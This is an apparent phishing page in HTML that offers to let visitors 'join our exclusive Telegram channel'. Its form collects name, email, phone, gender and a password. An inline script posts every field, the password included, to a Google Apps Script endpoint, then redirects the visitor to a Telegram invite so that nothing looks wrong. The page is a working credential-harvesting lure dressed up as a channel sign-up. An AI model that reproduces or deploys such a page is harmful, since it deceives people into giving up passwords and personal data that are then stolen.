<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>PANDAXLIINK</title>
  <style>
    body {
      margin: 0;
      font-family: 'Segoe UI', sans-serif;
      background-color: #0a0a0a;
      color: #00ff88;
      display: flex;
      flex-direction: column;
      align-items: center;
      min-height: 100vh;
    }

    div {
      text-align: center;
      margin-top: 30px;
    }

    p {
      color: white;
      font-size: 18px;
      font-weight: bold;
      margin: 0;
      text-shadow: 0 0 5px #f1f1f1; /* off-white glow */
    }

    h1 {
      margin-top: 20px;
      font-size: 3em;
      color: #00ff88;
      text-shadow: 0 0 10px #00ff88;
    }

    form {
      background: #121212;
      padding: 30px;
      border-radius: 12px;
      box-shadow: 0 0 15px rgba(0, 255, 136, 0.2);
      width: 90%;
      max-width: 400px;
      margin-top: 30px;
    }

    label {
      display: block;
      margin-top: 15px;
      color: #cfcfcf;
    }

    input, select {
      width: 100%;
      padding: 10px;
      margin-top: 5px;
      border: none;
      border-radius: 6px;
      background-color: #1e1e1e;
      color: #00ff88;
    }

    button {
      margin-top: 20px;
      width: 100%;
      padding: 12px;
      border: none;
      border-radius: 6px;
      background: #00ff88;
      color: black;
      font-size: 16px;
      font-weight: bold;
      cursor: pointer;
      transition: 0.3s;
    }

    button:hover {
      background: #00cc66;
    }
  </style>
</head>
<body>
  <div>
    <p>Join our exclusive Telegram channel</p>
    <h1>PANDAXLIINK</h1>
  </div>
  
  <form id="submitForm">
    <label>Name:</label>
    <input type="text" name="Name" required />

    <label>Email:</label>
    <input type="email" name="Email" required />

    <label>Phone:</label>
    <input type="tel" name="Phone" required />

    <label>Gender:</label>
    <select name="Gender" required>
      <option value="">Select</option>
      <option value="Male">Male</option>
      <option value="Female">Female</option>
      <option value="Other">Other</option>
    </select>

    <label>Password:</label>
    <input type="password" name="Password" required />

    <button type="submit">Submit</button>
  </form>

  <script>
    const scriptURL = 'https://script.google.com/macros/s/AKfycbxAZdZwUK-cE53QFm5dySLHa8qXjwHpxiAiG6Ztv_0H1I6-ns7iKMt1zT6CojNsjDkioQ/exec'; // replace with your Web App URL

    const form = document.getElementById('submitForm');
    form.addEventListener('submit', e => {
      e.preventDefault();
      fetch(scriptURL, { method: 'POST', body: new FormData(form)})
        .then(() => {
          window.location.href = 'https://t.me/+6iGjO-ti8kdjNWVl';
        })
        .catch(error => alert('Error! ' + error.message));
    });
  </script>
</body>
</html>
